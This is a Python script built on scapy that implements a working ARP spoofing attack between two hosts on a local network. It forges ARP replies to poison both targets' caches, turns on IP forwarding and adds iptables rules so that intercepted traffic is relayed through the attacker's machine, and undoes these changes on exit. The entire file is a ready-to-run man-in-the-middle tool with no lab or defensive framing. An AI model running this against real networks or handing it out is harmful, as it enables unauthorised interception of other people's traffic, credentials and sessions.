from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp
import time
import sys
import argparse
import subprocess

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] Failed to get MAC for {ip}")
        return None

def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip)
    packet = Ether(dst=target_mac, src=get_if_hwaddr(interface)) / \
             ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=0)

def restore(destination_ip, source_ip, interface):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = Ether(dst=destination_mac, src=get_if_hwaddr(interface)) / \
             ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                 psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=4, iface=interface, verbose=0)
    
def enable_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)

def disable_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
    
def manage_iptables(action):
    commands = [
        ['iptables', '-I', 'FORWARD', '-p', 'icmp', '-j', 'ACCEPT'],
        ['iptables', '-I', 'FORWARD', '-p', 'tcp', '-j', 'ACCEPT']
    ]
    
    try:
        for cmd in commands:
            if action == "add":
                subprocess.run(['sudo'] + cmd, check=True)
            elif action == "remove":
                subprocess.run(['sudo', 'iptables', '-D', cmd[2]] + cmd[3:], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error in iptables: {e}")
        sys.exit(1)


if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='ARP Spoofer')
    parser.add_argument('target1', help='IP of first target')
    parser.add_argument('target2', help='IP of second target')
    parser.add_argument('-i', '--interface', default='eth0',
                       help='Network interface (default: eth0)')
    parser.add_argument('-r', '--recursive', type=int, default=0,
                           help='Seconds between ARP recursive requests (0=once, default:0)')
    
    args = parser.parse_args()
    
    src_ip = args.target1
    dst_ip = args.target2
    iface = args.interface
    recursive = args.recursive
    
    try:
        print(f"[*] Enabling IP forwarding")
        enable_ip_forwarding()
        print(f"[*] Adding iptables rules")
        manage_iptables("add")
        print(f"[*] Starting ARP spoofing attack between {args.target1} and {args.target2}")
        print("[*] Press CTRL+C to restore and exit")
        while True: 
            spoof(src_ip, dst_ip, iface)
            spoof(dst_ip, src_ip, iface)
            if recursive <=0:
                break  
            time.sleep(recursive)
            
        if recursive <=0:
            while True:
                time.sleep(3600)
            
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables")
        restore(src_ip, dst_ip, iface)
        restore(dst_ip, src_ip, iface)
        manage_iptables("remove")
        disable_ip_forwarding()
        sys.exit(0)


